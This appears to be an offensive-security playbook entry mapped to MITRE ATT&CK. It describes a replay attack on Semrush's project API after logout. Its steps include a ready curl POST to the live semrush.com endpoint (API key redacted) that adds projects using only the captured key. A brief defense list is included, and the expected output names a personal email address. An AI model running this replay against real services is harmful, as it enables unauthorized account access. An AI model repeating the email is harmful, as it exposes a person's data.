---
tags:
  - replay-attack
  - session-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/replay-semrush-request-post-logout]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:31:11.270Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1ea0944b-8341-452d-b206-67f41b0abf9b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
---
# Replay-Request-Post-Logout-for-Same-User

## Summary

This procedure replays a captured Semrush project creation request after logging out, proving that the API key authenticates independently of session cookies, allowing unauthorized project additions.

## Description

Following request capture, log out to end the session and replay the POST to /projects/api/projects/?key= with modified JSON payload. The server accepts the request solely based on the API key, without validating PHPSESSID or other session elements, enabling persistent access post-logout. This exploits the lack of session-API key binding.

## Requirements

1. Captured request from previous procedure including API key
2. Tool for sending HTTP requests (e.g., curl)
3. No active Semrush session

## Defense

Defensive measures and detection strategies:

- Bind API requests to active sessions via tokens
- Implement request signing or nonces to prevent replays
- Rate-limit API key usage and expire keys on logout
- Audit logs for post-logout API activity

## Objectives

1. Bypass session termination to add projects
2. Confirm authentication flaw
3. Demonstrate impact on same-user account

## Instructions

### Step 1: Logout and Session Termination

**Context**: End the active session to simulate a logged-out state.

> Manually log out via Semrush UI and close browser.

### Step 2: Replay Captured Request

**Context**: Modify payload for a new project and send using the same API key.

**Command** ([[commands/replay-semrush-request-post-logout]]):
```bash
curl -X POST "https://www.semrush.com/projects/api/projects/?key=█████████" \
  -H "Host: www.semrush.com" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0" \
  -H "Content-Type: application/json" \
  -H "Cookie: cfduid=...; PHPSESSID=...; ..." \
  -d '{"domain":"Walterwhite12.com","name":"Walterwhite12.com","url":"Walterwhite12.com","acl":{"write":true}}'
```

> Expected output: HTTP 200 with JSON confirming addition, e.g., project ID 1266025 and email saidutt.mekala@gmail.com.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[External Remote Services]] External Remote Services

### Sub-Techniques


## Commands Used

- [[commands/replay-semrush-request-post-logout]]

## Tools Used


## Tags

- replay-attack
- session-bypass
